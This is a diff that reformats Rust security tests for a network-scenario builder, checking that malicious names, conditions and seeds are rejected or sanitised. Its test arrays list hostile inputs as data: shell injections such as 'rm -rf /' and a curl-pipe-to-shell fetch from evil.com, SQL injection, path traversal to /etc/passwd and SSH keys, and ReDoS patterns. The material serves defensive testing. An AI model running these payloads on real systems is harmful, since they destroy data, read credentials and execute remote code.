             let mut attack_builder = ScenarioBuilder::new(&format!("fault_attack_{}", attack_idx));
@@ -4850,28 +5633,56 @@ mod tests {
 
                             for (profile_link, profile_config) in fault_profiles {
                                 // Verify no command injection occurred
-                                assert!(!profile_link.contains("rm -rf"),
-                                    "Attack {}: Command injection should not be present in link name", attack_idx);
-                                assert!(!profile_link.contains("DROP TABLE"),
-                                    "Attack {}: SQL injection should not be present in link name", attack_idx);
+                                assert!(
+                                    !profile_link.contains("rm -rf"),
+                                    "Attack {}: Command injection should not be present in link name",
+                                    attack_idx
+                                );
+                                assert!(
+                                    !profile_link.contains("DROP TABLE"),
+                                    "Attack {}: SQL injection should not be present in link name",
+                                    attack_idx
+                                );
 
                                 // Verify numerical safety
-                                assert!(profile_config.packet_loss_rate.is_finite() || profile_config.packet_loss_rate == 0.0,
-                                    "Attack {}: Packet loss rate should be finite or zero", attack_idx);
-                                assert!(profile_config.corruption_rate.is_finite() || profile_config.corruption_rate == 0.0,
-                                    "Attack {}: Corruption rate should be finite or zero", attack_idx);
+                                assert!(
+                                    profile_config.packet_loss_rate.is_finite()
+                                        || profile_config.packet_loss_rate == 0.0,
+                                    "Attack {}: Packet loss rate should be finite or zero",
+                                    attack_idx
+                                );
+                                assert!(
+                                    profile_config.corruption_rate.is_finite()
+                                        || profile_config.corruption_rate == 0.0,
+                                    "Attack {}: Corruption rate should be finite or zero",
+                                    attack_idx
+                                );
 
                                 // Verify bounds checking
-                                assert!(profile_config.packet_loss_rate >= 0.0 && profile_config.packet_loss_rate <= 1.0,
-                                    "Attack {}: Packet loss rate should be in valid range [0.0, 1.0]", attack_idx);
-                                assert!(profile_config.corruption_rate >= 0.0 && profile_config.corruption_rate <= 1.0,
-                                    "Attack {}: Corruption rate should be in valid range [0.0, 1.0]", attack_idx);
+                                assert!(
+                                    profile_config.packet_loss_rate >= 0.0
+                                        && profile_config.packet_loss_rate <= 1.0,
+                                    "Attack {}: Packet loss rate should be in valid range [0.0, 1.0]",
+                                    attack_idx
+                                );
+                                assert!(
+                                    profile_config.corruption_rate >= 0.0
+                                        && profile_config.corruption_rate <= 1.0,
+                                    "Attack {}: Corruption rate should be in valid range [0.0, 1.0]",
+                                    attack_idx
+                                );
 
                                 // Verify reasonable latency and bandwidth limits
-                                assert!(profile_config.latency_ms < 1000000,
-                                    "Attack {}: Latency should be reasonable", attack_idx);
-                                assert!(profile_config.bandwidth_kbps < 10000000,
-                                    "Attack {}: Bandwidth should be reasonable", attack_idx);
+                                assert!(
+                                    profile_config.latency_ms < 1000000,
+                                    "Attack {}: Latency should be reasonable",
+                                    attack_idx
+                                );
+                                assert!(
+                                    profile_config.bandwidth_kbps < 10000000,
+                                    "Attack {}: Bandwidth should be reasonable",
+                                    attack_idx
+                                );
                             }
 
                             // Test serialization safety
@@ -4879,32 +5690,53 @@ mod tests {
                             match serialize_result {
                                 Ok(json) => {
                                     // Verify no injection in serialized JSON
-                                    assert!(!json.contains("rm -rf"),
-                                        "Attack {}: Serialized JSON should not contain command injection", attack_idx);
-                                    assert!(!json.contains("DROP TABLE"),
-                                        "Attack {}: Serialized JSON should not contain SQL injection", attack_idx);
-                                    assert!(!json.contains('\0'),
-                                        "Attack {}: Serialized JSON should not contain null bytes", attack_idx);
-                                },
+                                    assert!(
+                                        !json.contains("rm -rf"),
+                                        "Attack {}: Serialized JSON should not contain command injection",
+                                        attack_idx
+                                    );
+                                    assert!(
+                                        !json.contains("DROP TABLE"),
+                                        "Attack {}: Serialized JSON should not contain SQL injection",
+                                        attack_idx
+                                    );
+                                    assert!(
+                                        !json.contains('\0'),
+                                        "Attack {}: Serialized JSON should not contain null bytes",
+                                        attack_idx
+                                    );
+                                }
                                 Err(e) => {
-                                    println!("Attack {}: Serialization failed safely: {}", attack_idx, e);
+                                    println!(
+                                        "Attack {}: Serialization failed safely: {}",
+                                        attack_idx, e
+                                    );
                                 }
                             }
-                        },
+                        }
                         Err(e) => {
                             // Expected behavior - malicious config should be rejected
                             let error_msg = e.to_string();
-                            assert!(!error_msg.contains('\0'),
-                                "Attack {}: Error message should not contain null bytes", attack_idx);
-                            assert!(!error_msg.is_empty(),
-                                "Attack {}: Error should provide meaningful message", attack_idx);
+                            assert!(
+                                !error_msg.contains('\0'),
+                                "Attack {}: Error message should not contain null bytes",
+                                attack_idx
+                            );
+                            assert!(
+                                !error_msg.is_empty(),
+                                "Attack {}: Error should provide meaningful message",
+                                attack_idx
+                            );
                             println!("Attack {} rejected with error: {}", attack_idx, error_msg);
                         }
                     }
-                },
+                }
                 Err(_) => {
                     // Panic during injection - this indicates severe issue, but test should continue
-                    println!("Attack {} caused panic (handled by catch_unwind)", attack_idx);
+                    println!(
+                        "Attack {} caused panic (handled by catch_unwind)",
+                        attack_idx
+                    );
                 }
             }
         }
@@ -4914,19 +5746,18 @@ mod tests {
             // Boundary values
             LinkFaultConfig {
                 link_name: "boundary_test".to_string(),
-                packet_loss_rate: 1.0,  // Maximum valid loss
-                latency_ms: 0,          // Minimum latency
-                bandwidth_kbps: 1,      // Minimum bandwidth
-                corruption_rate: 1.0,   // Maximum valid corruption
+                packet_loss_rate: 1.0, // Maximum valid loss
+                latency_ms: 0,         // Minimum latency
+                bandwidth_kbps: 1,     // Minimum bandwidth
+                corruption_rate: 1.0,  // Maximum valid corruption
             },
-
             // Precision edge cases
             LinkFaultConfig {
                 link_name: "precision_test".to_string(),
                 packet_loss_rate: 0.000000001, // Very small loss
                 latency_ms: 1,
                 bandwidth_kbps: 999999,
-                corruption_rate: 0.000000001,  // Very small corruption
+                corruption_rate: 0.000000001, // Very small corruption
             },
         ];
 
@@ -4939,12 +5770,18 @@ mod tests {
             edge_builder.set_seed(99999 + edge_idx as u64);
 
             let edge_result = edge_builder.build();
-            assert!(edge_result.is_ok(),
-                "Edge case {}: Valid boundary values should be accepted", edge_idx);
+            assert!(
+                edge_result.is_ok(),
+                "Edge case {}: Valid boundary values should be accepted",
+                edge_idx
+            );
         }
 
-        println!("Fault profile injection test completed: {} malicious configs + {} edge cases tested",
-            malicious_fault_configs.len(), edge_case_configs.len());
+        println!(
+            "Fault profile injection test completed: {} malicious configs + {} edge cases tested",
+            malicious_fault_configs.len(),
+            edge_case_configs.len()
+        );
     }
 
     #[test]
@@ -4965,67 +5802,55 @@ mod tests {
             "eval('while(true) {}')",
             "setTimeout(function() { process.exit(1); }, 0)",
             "require('fs').writeFileSync('/tmp/pwned', 'hacked')",
-
             // Shell command injection
             "; rm -rf / #",
             "$(rm -rf /)",
             "`whoami > /tmp/user`",
             "| cat /etc/passwd",
             "&& curl evil.com/backdoor.sh | sh",
-
             // SQL injection patterns
             "'; DROP TABLE nodes; --",
             "' OR '1'='1",
             "' UNION SELECT * FROM system_info --",
             "'; INSERT INTO backdoors VALUES ('evil'); --",
-
             // Regular expression DoS (ReDoS)
             "(a+)+$",
             "^(a|a)*$",
             "(a|a)*",
             "a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*a*",
-
             // Format string injection
             "%n%n%n%n%n%n%n%n%n%n",
             "%s%s%s%s%s%s%s%s%s%s",
             "%x%x%x%x%x%x%x%x%x%x",
-
             // Unicode injection attacks
             "\u{202E}REVERSED_LOGIC\u{202D}",
             "\u{200B}INVISIBLE_CONDITION",
             "\u{FEFF}BOM_INJECTION",
             "\u{034F}COMBINING_ATTACK",
-
             // XML/JSON injection
             "</condition><evil>injected</evil><condition>",
             "\"condition\": true, \"injected\": \"evil\"",
             "<?xml version='1.0'?><evil>injection</evil>",
-
             // Buffer overflow simulation
             "A".repeat(100000),
             "\x00".repeat(1000),
             "\u{00FF}".repeat(1000),
-
             // Null byte injection
             "valid_condition\x00evil_payload",
             "\x00; rm -rf /",
             "condition\x00\x01\x02\x03",
-
             // Control character flood
             "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F",
             "\x1B[31mRED_ALERT\x1B[0m",
             "\r\nINJECTED_LINE\r\n",
-
             // Path traversal
             "../../../etc/passwd",
             "..\\..\\..\\windows\\system32\\cmd.exe",
             "/proc/self/environ",
-
             // Environment variable injection
             "${PATH}",
             "$HOME/.ssh/id_rsa",
             "${IFS}injection",
-
             // Network injection
             "http://evil.com/payload",
             "ftp://attacker.com/backdoor",
@@ -5033,7 +5858,9 @@ mod tests {
         ];
 
         for (bomb_idx, malicious_condition) in logic_bomb_conditions.iter().enumerate() {
-            println!("Testing logic bomb assertion {}: {}", bomb_idx,
+            println!(
+                "Testing logic bomb assertion {}: {}",
+                bomb_idx,
                 if malicious_condition.len() > 50 {
                     format!("{}...", &malicious_condition[..50])
                 } else {
@@ -5065,24 +5892,45 @@ mod tests {
 
                             for (assertion_id, assertion) in assertions {
                                 // Verify no command execution in assertion condition
-                                assert!(!assertion.condition.contains("rm -rf"),
-                                    "Bomb {}: Command injection should not be in assertion condition", bomb_idx);
-                                assert!(!assertion.condition.contains("eval("),
-                                    "Bomb {}: Code injection should not be in assertion condition", bomb_idx);
-                                assert!(!assertion.condition.contains("DROP TABLE"),
-                                    "Bomb {}: SQL injection should not be in assertion condition", bomb_idx);
+                                assert!(
+                                    !assertion.condition.contains("rm -rf"),
+                                    "Bomb {}: Command injection should not be in assertion condition",
+                                    bomb_idx
+                                );
+                                assert!(
+                                    !assertion.condition.contains("eval("),
+                                    "Bomb {}: Code injection should not be in assertion condition",
+                                    bomb_idx
+                                );
+                                assert!(
+                                    !assertion.condition.contains("DROP TABLE"),
+                                    "Bomb {}: SQL injection should not be in assertion condition",
+                                    bomb_idx
+                                );
 
                                 // Verify condition string safety
-                                assert!(!assertion.condition.contains('\0'),
-                                    "Bomb {}: Assertion condition should not contain null bytes", bomb_idx);
-                                assert!(assertion.condition.len() <= 100000,
-                                    "Bomb {}: Assertion condition should have reasonable length limit", bomb_idx);
+                                assert!(
+                                    !assertion.condition.contains('\0'),
+                                    "Bomb {}: Assertion condition should not contain null bytes",
+                                    bomb_idx
+                                );
+                                assert!(
+                                    assertion.condition.len() <= 100000,
+                                    "Bomb {}: Assertion condition should have reasonable length limit",
+                                    bomb_idx
+                                );
 
                                 // Verify assertion ID safety
-                                assert!(!assertion_id.contains('\0'),
-                                    "Bomb {}: Assertion ID should not contain null bytes", bomb_idx);
-                                assert!(!assertion_id.contains(".."),
-                                    "Bomb {}: Assertion ID should not contain path traversal", bomb_idx);
+                                assert!(
+                                    !assertion_id.contains('\0'),
+                                    "Bomb {}: Assertion ID should not contain null bytes",
+                                    bomb_idx
+                                );
+                                assert!(
+                                    !assertion_id.contains(".."),
+                                    "Bomb {}: Assertion ID should not contain path traversal",
+                                    bomb_idx
+                                );
                             }
 
                             // Test scenario serialization safety
@@ -5090,36 +5938,61 @@ mod tests {
                             match serialize_result {
                                 Ok(json) => {
                                     // Verify no injection in serialized output
-                                    assert!(!json.contains("rm -rf"),
-                                        "Bomb {}: JSON should not contain command injection", bomb_idx);
-                                    assert!(!json.contains("eval("),
-                                        "Bomb {}: JSON should not contain code injection", bomb_idx);
-                                    assert!(!json.contains('\0'),
-                                        "Bomb {}: JSON should not contain null bytes", bomb_idx);
+                                    assert!(
+                                        !json.contains("rm -rf"),
+                                        "Bomb {}: JSON should not contain command injection",
+                                        bomb_idx
+                                    );
+                                    assert!(
+                                        !json.contains("eval("),
+                                        "Bomb {}: JSON should not contain code injection",
+                                        bomb_idx
+                                    );
+                                    assert!(
+                                        !json.contains('\0'),
+                                        "Bomb {}: JSON should not contain null bytes",
+                                        bomb_idx
+                                    );
 
                                     // Verify JSON structure integrity
-                                    let parse_back_result: Result<serde_json::Value, _> = serde_json::from_str(&json);
-                                    assert!(parse_back_result.is_ok(),
-                                        "Bomb {}: Serialized JSON should parse back correctly", bomb_idx);
-                                },
+                                    let parse_back_result: Result<serde_json::Value, _> =
+                                        serde_json::from_str(&json);
+                                    assert!(
+                                        parse_back_result.is_ok(),
+                                        "Bomb {}: Serialized JSON should parse back correctly",
+                                        bomb_idx
+                                    );
+                                }
                                 Err(e) => {
-                                    println!("Bomb {}: Serialization failed safely: {}", bomb_idx, e);
+                                    println!(
+                                        "Bomb {}: Serialization failed safely: {}",
+                                        bomb_idx, e
+                                    );
                                 }
                             }
-                        },
+                        }
                         Err(e) => {
                             // Expected behavior - malicious assertion should be rejected
                             let error_msg = e.to_string();
-                            assert!(!error_msg.contains('\0'),
-                                "Bomb {}: Error message should not contain null bytes", bomb_idx);
-                            assert!(!error_msg.is_empty(),
-                                "Bomb {}: Error should provide meaningful message", bomb_idx);
-                            assert!(error_msg.len() <= 1000,
-                                "Bomb {}: Error message should have reasonable length", bomb_idx);
+                            assert!(
+                                !error_msg.contains('\0'),
+                                "Bomb {}: Error message should not contain null bytes",
+                                bomb_idx
+                            );
+                            assert!(
+                                !error_msg.is_empty(),
+                                "Bomb {}: Error should provide meaningful message",
+                                bomb_idx
+                            );
+                            assert!(
+                                error_msg.len() <= 1000,
+                                "Bomb {}: Error message should have reasonable length",
+                                bomb_idx
+                            );
                             println!("Bomb {} rejected: {}", bomb_idx, error_msg);
                         }
                     }
-                },
+                }
                 Err(_) => {
                     // Panic during logic bomb injection - handled by catch_unwind
                     println!("Bomb {} caused panic (safely caught)", bomb_idx);
@@ -5127,14 +6000,18 @@ mod tests {
             }
 
             // Test that system remains functional after logic bomb attempt
-            let mut recovery_builder = ScenarioBuilder::new(&format!("post_bomb_recovery_{}", bomb_idx));
+            let mut recovery_builder =
+                ScenarioBuilder::new(&format!("post_bomb_recovery_{}", bomb_idx));
             recovery_builder.add_node("recovery_node");
             recovery_builder.add_assertion("safe_assertion", "recovery_node", "true");
             recovery_builder.set_seed(333333 + bomb_idx as u64);
 
             let recovery_result = recovery_builder.build();
-            assert!(recovery_result.is_ok(),
-                "Bomb {}: System should recover after logic bomb attempt", bomb_idx);
+            assert!(
+                recovery_result.is_ok(),
+                "Bomb {}: System should recover after logic bomb attempt",
+                bomb_idx
+            );
         }
 
         // Test assertion condition length limits
@@ -5163,10 +6040,13 @@ mod tests {
                     // If accepted, verify length is managed safely
                     let assertions = scenario.assertions();
                     for (_, assertion) in assertions {
-                        assert!(assertion.condition.len() <= 100000,
-                            "Length bomb {}: Condition length should be limited", len_idx);
+                        assert!(
+                            assertion.condition.len() <= 100000,
+                            "Length bomb {}: Condition length should be limited",
+                            len_idx
+                        );
                     }
-                },
+                }
                 Err(e) => {
                     // Rejection due to length limits is acceptable
                     println!("Length bomb {} rejected: {}", len_idx, e);
@@ -5174,8 +6054,11 @@ mod tests {
             }
         }
 
-        println!("Logic bomb injection test completed: {} malicious conditions + {} length bombs tested",
-            logic_bomb_conditions.len(), length_bomb_conditions.len());
+        println!(
+            "Logic bomb injection test completed: {} malicious conditions + {} length bombs tested",
+            logic_bomb_conditions.len(),
+            length_bomb_conditions.len()
+        );
     }
 
     #[test]
@@ -5185,17 +6068,17 @@ mod tests {
 
         // Test seed collision and predictability attacks
         let predictability_seeds = [
-            0,                    // Zero seed (should be rejected)
-            1,                    // Minimal seed (predictable)
-            u64::MAX,            // Maximum seed
-            0x0000000000000001,   // Low entropy
-            0x1111111111111111,   // Pattern repetition
-            0x0123456789ABCDEF,   // Sequential pattern
+            0,                     // Zero seed (should be rejected)
+            1,                     // Minimal seed (predictable)
+            u64::MAX,              // Maximum seed
+            0x0000000000000001,    // Low entropy
+            0x1111111111111111,    // Pattern repetition
+            0x0123456789ABCDEF,    // Sequential pattern
             0xAAAAAAAAAAAAAAAAu64, // Alternating bits
-            0x5555555555555555,   // Inverse alternating bits
-            0xDEADBEEFDEADBEEF,   // Known constant repetition
-            0x8000000000000000,   // Single high bit
-            0x7FFFFFFFFFFFFFFF,   // All bits except high
+            0x5555555555555555,    // Inverse alternating bits
+            0xDEADBEEFDEADBEEF,    // Known constant repetition
+            0x8000000000000000,    // Single high bit
+            0x7FFFFFFFFFFFFFFF,    // All bits except high
         ];
 
         let mut seed_collision_map = std::collections::HashMap::new();
@@ -5220,24 +6103,36 @@ mod tests {
 
                             // Verify zero seed handling
                             if *test_seed == 0 {
-                                assert_ne!(actual_seed, 0,
-                                    "Seed {}: Zero seed should be rejected or replaced", seed_idx);
+                                assert_ne!(
+                                    actual_seed, 0,
+                                    "Seed {}: Zero seed should be rejected or replaced",
+                                    seed_idx
+                                );
                             } else {
-                                assert_eq!(actual_seed, *test_seed,
-                                    "Seed {}: Non-zero seed should be preserved", seed_idx);
+                                assert_eq!(
+                                    actual_seed, *test_seed,
+                                    "Seed {}: Non-zero seed should be preserved",
+                                    seed_idx
+                                );
                             }
 
                             // Track seed usage for collision detection
-                            if let Some(prev_idx) = seed_collision_map.insert(actual_seed, seed_idx) {
+                            if let Some(prev_idx) = seed_collision_map.insert(actual_seed, seed_idx)
+                            {
                                 if prev_idx != seed_idx {
-                                    println!("WARNING: Seed collision detected: seed {} used by both test {} and {}",
-                                        actual_seed, prev_idx, seed_idx);
+                                    println!(
+                                        "WARNING: Seed collision detected: seed {} used by both test {} and {}",
+                                        actual_seed, prev_idx, seed_idx
+                                    );
                                 }
                             }
 
                             // Test determinism with repeated builds
                             for repeat in 0..5 {
-                                let mut repeat_builder = ScenarioBuilder::new(&format!("repeat_{}_{}", seed_idx, repeat));
+                                let mut repeat_builder = ScenarioBuilder::new(&format!(
+                                    "repeat_{}_{}",
+                                    seed_idx, repeat
+                                ));
                                 repeat_builder.add_node("seed_node_a");
                                 repeat_builder.add_node("seed_node_b");
                                 repeat_builder.add_link("seed_link", "seed_node_a", "seed_node_b");
@@ -5246,31 +6141,50 @@ mod tests {
                                 let repeat_result = repeat_builder.build();
                                 if let Ok(repeat_scenario) = repeat_result {
                                     // Same seed should produce deterministic results
-                                    assert_eq!(repeat_scenario.seed(), scenario.seed(),
-                                        "Seed {}: Determinism check {} failed", seed_idx, repeat);
+                                    assert_eq!(
+                                        repeat_scenario.seed(),
+                                        scenario.seed(),
+                                        "Seed {}: Determinism check {} failed",
+                                        seed_idx,
+                                        repeat
+                                    );
 
                                     // Verify scenario structure determinism
-                                    assert_eq!(repeat_scenario.nodes().len(), scenario.nodes().len(),
-                                        "Seed {}: Node count should be deterministic", seed_idx);
-                                    assert_eq!(repeat_scenario.links().len(), scenario.links().len(),
-                                        "Seed {}: Link count should be deterministic", seed_idx);
+                                    assert_eq!(
+                                        repeat_scenario.nodes().len(),
+                                        scenario.nodes().len(),
+                                        "Seed {}: Node count should be deterministic",
+                                        seed_idx
+                                    );
+                                    assert_eq!(
+                                        repeat_scenario.links().len(),
+                                        scenario.links().len(),
+                                        "Seed {}: Link count should be deterministic",
+                                        seed_idx
+                                    );
                                 }
                             }
 
-                            println!("Seed test {}: seed 0x{:016X} -> actual 0x{:016X}",
-                                seed_idx, test_seed, actual_seed);
-                        },
+                            println!(
+                                "Seed test {}: seed 0x{:016X} -> actual 0x{:016X}",
+                                seed_idx, test_seed, actual_seed
+                            );
+                        }
                         Err(e) => {
                             // Zero seed should be rejected
                             if *test_seed == 0 {
-                                assert!(e.to_string().contains("NO_SEED") || e.to_string().contains("zero"),
-                                    "Seed {}: Zero seed should be rejected with appropriate error", seed_idx);
+                                assert!(
+                                    e.to_string().contains("NO_SEED")
+                                        || e.to_string().contains("zero"),
+                                    "Seed {}: Zero seed should be rejected with appropriate error",
+                                    seed_idx
+                                );
                             } else {
                                 println!("Seed {} rejected: {}", seed_idx, e);
                             }
                         }
                     }
-                },
+                }
                 Err(_) => {
                     println!("Seed {} caused panic (safely caught)", seed_idx);
                 }
@@ -5287,7 +6201,8 @@ mod tests {
 
         let mut successful_entropy_builds = 0;
         for (entropy_idx, entropy_seed) in entropy_seeds.iter().enumerate() {
-            let mut entropy_builder = ScenarioBuilder::new(&format!("entropy_test_{}", entropy_idx));
+            let mut entropy_builder =
+                ScenarioBuilder::new(&format!("entropy_test_{}", entropy_idx));
             entropy_builder.add_node("entropy_node");
             entropy_builder.set_seed(*entropy_seed);
 
@@ -5295,30 +6210,48 @@ mod tests {
                 successful_entropy_builds += 1;
 
                 // Verify seed preservation
-                assert_eq!(entropy_scenario.seed(), *entropy_seed,
-                    "Entropy seed {} should be preserved", entropy_idx);
+                assert_eq!(
+                    entropy_scenario.seed(),
+                    *entropy_seed,
+                    "Entropy seed {} should be preserved",
+                    entropy_idx
+                );
 
                 // Test seed serialization and deserialization
                 let serialize_result = serde_json::to_string(&entropy_scenario);
-                assert!(serialize_result.is_ok(),
-                    "Entropy scenario {} should serialize successfully", entropy_idx);
+                assert!(
+                    serialize_result.is_ok(),
+                    "Entropy scenario {} should serialize successfully",
+                    entropy_idx
+                );
 
                 if let Ok(serialized) = serialize_result {
                     // Verify seed is present in serialized form
-                    assert!(serialized.contains(&format!("{}", entropy_seed)),
-                        "Entropy seed {} should appear in serialized JSON", entropy_idx);
+                    assert!(
+                        serialized.contains(&format!("{}", entropy_seed)),
+                        "Entropy seed {} should appear in serialized JSON",
+                        entropy_idx
+                    );
 
                     // Test deserialization
                     let deserialize_result: Result<Scenario, _> = serde_json::from_str(&serialized);
                     if let Ok(deserialized_scenario) = deserialize_result {
-                        assert_eq!(deserialized_scenario.seed(), *entropy_seed,
-                            "Entropy seed {} should survive serialization round-trip", entropy_idx);
+                        assert_eq!(
+                            deserialized_scenario.seed(),
+                            *entropy_seed,
+                            "Entropy seed {} should survive serialization round-trip",
+                            entropy_idx
+                        );
                     }
                 }
             }
         }
 
-        println!("Entropy test: {}/{} seeds processed successfully", successful_entropy_builds, entropy_seeds.len());
+        println!(
+            "Entropy test: {}/{} seeds processed successfully",
+            successful_entropy_builds,
+            entropy_seeds.len()
+        );
 
         // Test seed manipulation via external modification
         let mut manipulation_builder = ScenarioBuilder::new("seed_manipulation_test");
@@ -5328,21 +6261,29 @@ mod tests {
         let manipulation_result = manipulation_builder.build();
         if let Ok(scenario) = manipulation_result {
             // Verify scenario immutability (seed cannot be changed after build)
-            assert_eq!(scenario.seed(), 0x1337DEADBEEF1337,
-                "Original seed should be preserved in built scenario");
+            assert_eq!(
+                scenario.seed(),
+                0x1337DEADBEEF1337,
+                "Original seed should be preserved in built scenario"
+            );
 
             // Test that built scenario maintains seed integrity
             let json = serde_json::to_string(&scenario).unwrap();
             let parsed: serde_json::Value = serde_json::from_str(&json).unwrap();
 
             if let Some(seed_value) = parsed.get("seed").and_then(|v| v.as_u64()) {
-                assert_eq!(seed_value, 0x1337DEADBEEF1337,
-                    "Seed should be correctly preserved in JSON serialization");
+                assert_eq!(
+                    seed_value, 0x1337DEADBEEF1337,
+                    "Seed should be correctly preserved in JSON serialization"
+                );
             }
         }
 
-        println!("Seed predictability test completed: {} predictability patterns + {} entropy tests + immutability verification",
-            predictability_seeds.len(), entropy_seeds.len());
+        println!(
+            "Seed predictability test completed: {} predictability patterns + {} entropy tests + immutability verification",
+            predictability_seeds.len(),
+            entropy_seeds.len()
+        );
     }
 
     #[test]
@@ -5357,46 +6298,67 @@ mod tests {
         // JSON injection attack patterns in various scenario components
         let json_corruption_attacks = [
             // Object key injection attempts
-            ("node\",\"injected\":\"evil",              "JSON key injection in node name"),
-            ("node\\\":{\"payload\":\"evil\"}//",      "Escaped quote injection"),
-            ("node\x22malicious\x22",                   "Raw quote character injection"),
-
+            (
+                "node\",\"injected\":\"evil",
+                "JSON key injection in node name",
+            ),
+            (
+                "node\\\":{\"payload\":\"evil\"}//",
+                "Escaped quote injection",
+            ),
+            ("node\x22malicious\x22", "Raw quote character injection"),
             // JSON structure corruption
-            ("node}],\"injected\":[{\"evil",            "Structure breaking injection"),
-            ("node\n},\n{\"evil\":\"payload\"",        "Newline-based structure injection"),
-            ("node\"},\"corrupted\":true,\"original\":{\"node", "Complete object injection"),
-
+            (
+                "node}],\"injected\":[{\"evil",
+                "Structure breaking injection",
+            ),
+            (
+                "node\n},\n{\"evil\":\"payload\"",
+                "Newline-based structure injection",
+            ),
+            (
+                "node\"},\"corrupted\":true,\"original\":{\"node",
+                "Complete object injection",
+            ),
             // Unicode JSON corruption
-            ("node\u{0022}injected\u{0022}",           "Unicode quote injection"),
-            ("node\u{005C}u0022evil\u{005C}u0022",     "Escaped unicode injection"),
-            ("node\u{000A}evil\u{000A}",               "Unicode newline injection"),
-
+            ("node\u{0022}injected\u{0022}", "Unicode quote injection"),
+            (
+                "node\u{005C}u0022evil\u{005C}u0022",
+                "Escaped unicode injection",
+            ),
+            ("node\u{000A}evil\u{000A}", "Unicode newline injection"),
             // Control character corruption
-            ("node\x08\x09\x0A\x0C\x0D",               "Control character flood"),
-            ("node\x1B[0mRESET\x1B[31mRED",            "ANSI escape in JSON"),
-            ("node\x00NULL_TERMINATION",               "Null byte injection"),
-
+            ("node\x08\x09\x0A\x0C\x0D", "Control character flood"),
+            ("node\x1B[0mRESET\x1B[31mRED", "ANSI escape in JSON"),
+            ("node\x00NULL_TERMINATION", "Null byte injection"),
             // Number format corruption
-            ("node123.456e789",                         "Extreme number formatting"),
-            ("node-Infinity",                           "Negative infinity injection"),
-            ("nodeNaN",                                 "NaN value injection"),
-
+            ("node123.456e789", "Extreme number formatting"),
+            ("node-Infinity", "Negative infinity injection"),
+            ("nodeNaN", "NaN value injection"),
             // String escape corruption
-            ("node\\n\\r\\t\\f\\b",                    "Escape sequence injection"),
-            ("node\\/\\/comment_injection",            "Comment-style injection"),
-            ("node\\u0000\\u0001\\u0002",              "Unicode escape injection"),
-
+            ("node\\n\\r\\t\\f\\b", "Escape sequence injection"),
+            ("node\\/\\/comment_injection", "Comment-style injection"),
+            ("node\\u0000\\u0001\\u0002", "Unicode escape injection"),
             // Array/Object injection
-            ("node[],\"injected_array\":[",            "Array injection attempt"),
-            ("node{},\"injected_object\":{",           "Object injection attempt"),
-            ("node\":[1,2,3],\"evil\":[4,5,6],\"node", "Complex injection"),
+            ("node[],\"injected_array\":[", "Array injection attempt"),
+            ("node{},\"injected_object\":{", "Object injection attempt"),
+            (
+                "node\":[1,2,3],\"evil\":[4,5,6],\"node",
+                "Complex injection",
+            ),
         ];
 
-        for (attack_idx, (malicious_name, attack_description)) in json_corruption_attacks.iter().enumerate() {
-            println!("Testing JSON corruption attack {}: {}", attack_idx, attack_description);
+        for (attack_idx, (malicious_name, attack_description)) in
+            json_corruption_attacks.iter().enumerate()
+        {
+            println!(
+                "Testing JSON corruption attack {}: {}",
+                attack_idx, attack_description
+            );
 
             // Test node name corruption
-            let mut node_attack_builder = ScenarioBuilder::new(&format!("json_attack_node_{}", attack_idx));
+            let mut node_attack_builder =
+                ScenarioBuilder::new(&format!("json_attack_node_{}", attack_idx));
             node_attack_builder.add_node(malicious_name);
             node_attack_builder.set_seed(666666 + attack_idx as u64);
 
@@ -5410,46 +6372,78 @@ mod tests {
                     match serialize_result {
                         Ok(json) => {
                             // Verify no JSON structure corruption
-                            assert!(!json.contains("\"injected\":"),
-                                "Node attack {}: JSON should not contain injected fields", attack_idx);
-                            assert!(!json.contains("\"evil\":"),
-                                "Node attack {}: JSON should not contain evil payloads", attack_idx);
-                            assert!(!json.contains("\"corrupted\":true"),
-                                "Node attack {}: JSON should not contain corruption markers", attack_idx);
+                            assert!(
+                                !json.contains("\"injected\":"),
+                                "Node attack {}: JSON should not contain injected fields",
+                                attack_idx
+                            );
+                            assert!(
+                                !json.contains("\"evil\":"),
+                                "Node attack {}: JSON should not contain evil payloads",
+                                attack_idx
+                            );
+                            assert!(
+                                !json.contains("\"corrupted\":true"),
+                                "Node attack {}: JSON should not contain corruption markers",
+                                attack_idx
+                            );
 
                             // Verify JSON structural integrity
-                            let parse_back_result: Result<serde_json::Value, _> = serde_json::from_str(&json);
-                            assert!(parse_back_result.is_ok(),
-                                "Node attack {}: Corrupted JSON should still parse correctly", attack_idx);
+                            let parse_back_result: Result<serde_json::Value, _> =
+                                serde_json::from_str(&json);
+                            assert!(
+                                parse_back_result.is_ok(),
+                                "Node attack {}: Corrupted JSON should still parse correctly",
+                                attack_idx
+                            );
 
                             if let Ok(parsed) = parse_back_result {
                                 // Verify parsed structure doesn't contain injected content
                                 let json_str = parsed.to_string();
-                                assert!(!json_str.contains("injected"),
-                                    "Node attack {}: Parsed JSON should not contain injected content", attack_idx);
-                                assert!(!json_str.contains("evil"),
-                                    "Node attack {}: Parsed JSON should not contain evil content", attack_idx);
+                                assert!(
+                                    !json_str.contains("injected"),
+                                    "Node attack {}: Parsed JSON should not contain injected content",
+                                    attack_idx
+                                );
+                                assert!(
+                                    !json_str.contains("evil"),
+                                    "Node attack {}: Parsed JSON should not contain evil content",
+                                    attack_idx
+                                );
                             }
 
                             // Test pretty-printed JSON safety
                             let pretty_result = serde_json::to_string_pretty(&scenario);
                             if let Ok(pretty_json) = pretty_result {
-                                assert!(!pretty_json.contains("\"injected\":"),
-                                    "Node attack {}: Pretty JSON should not contain injected fields", attack_idx);
-                                let pretty_parse: Result<serde_json::Value, _> = serde_json::from_str(&pretty_json);
-                                assert!(pretty_parse.is_ok(),
-                                    "Node attack {}: Pretty JSON should parse correctly", attack_idx);
+                                assert!(
+                                    !pretty_json.contains("\"injected\":"),
+                                    "Node attack {}: Pretty JSON should not contain injected fields",
+                                    attack_idx
+                                );
+                                let pretty_parse: Result<serde_json::Value, _> =
+                                    serde_json::from_str(&pretty_json);
+                                assert!(
+                                    pretty_parse.is_ok(),
+                                    "Node attack {}: Pretty JSON should parse correctly",
+                                    attack_idx
+                                );
                             }
-                        },
+                        }
                         Err(e) => {
                             // Serialization failure is acceptable for malformed input
-                            println!("Node attack {}: Serialization failed safely: {}", attack_idx, e);
+                            println!(
+                                "Node attack {}: Serialization failed safely: {}",
+                                attack_idx, e
+                            );
                             let error_msg = e.to_string();
-                            assert!(!error_msg.contains('\0'),
-                                "Node attack {}: Error should not contain null bytes", attack_idx);
